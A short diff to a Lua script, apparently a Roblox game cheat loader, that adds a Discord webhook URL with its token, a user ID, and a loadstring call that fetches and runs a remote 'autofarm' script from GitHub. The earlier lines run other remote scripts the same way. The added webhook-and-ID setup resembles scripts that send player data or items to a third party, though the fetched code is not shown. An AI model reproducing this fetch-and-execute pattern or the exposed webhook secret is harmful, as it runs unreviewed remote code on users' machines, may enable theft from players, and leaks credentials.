@@ -53,5 +53,8 @@ _G.Key = "(0oXeibooNiniMXo0)"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
 
 _G.Key = "(0oXeibooNiniMXo0)"
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
+
+_G.UserID = 4109385164
+_G.WebHook = "https://discord.com/api/webhooks/1056842763469082704/ib1CFCZO3GEM7dVcar36Yhzw2ar_K8BA0pnfFIEO3fo0WvXNQx2D5_1Yx8Wi-qG4dSz0"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
